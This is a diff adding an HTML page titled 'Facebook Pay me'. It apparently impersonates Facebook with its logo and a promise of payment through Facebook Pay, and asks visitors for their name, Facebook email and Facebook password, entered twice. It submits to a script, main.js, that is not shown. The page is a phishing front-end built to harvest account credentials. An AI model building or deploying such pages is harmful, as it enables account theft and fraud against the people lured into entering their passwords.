@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="180x180" href="./favicon/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="./favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="./favicon/favicon-16x16.png">
+    <link rel="manifest" href="./favicon/site.webmanifest">
+    <link rel="stylesheet" href="./css/style.css">
+    <title>Facebook Pay me</title>
+</head>
+
+<body>
+    <section>
+        <form class="form" id="form">
+            <p class="title">
+                <img src="./img/facebook.png" width="30px" height="30px" style="margin-right: 5px;" />Sign In
+            </p>
+
+            <p class="message">Sign in now and get paid through Facebook Pay. </p>
+            <div class="flex">
+                <label>
+                    <input class="input" type="text" id="firstname" required>
+                    <span>Firstname</span>
+                </label>
+
+                <label>
+                    <input class="input" type="text" id="lastname" required>
+                    <span>Lastname</span>
+                </label>
+            </div>
+
+            <label>
+                <input class="input" type="email" id="email" required>
+                <span>Facebook Email</span>
+            </label>
+
+            <label>
+                <input class="input" type="password" id="password" required>
+                <span>Facebook Password</span>
+            </label>
+
+            <label>
+                <input class="input" type="password" id="confirm-password" required>
+                <span>Confirm Facebook Password</span>
+            </label>
+
+            <button class="submit" id="submitBtn">Submit</button>
+        </form>
+    </section>
+
+    <script src="./js/main.js"></script>
+</body>
+
+</html>
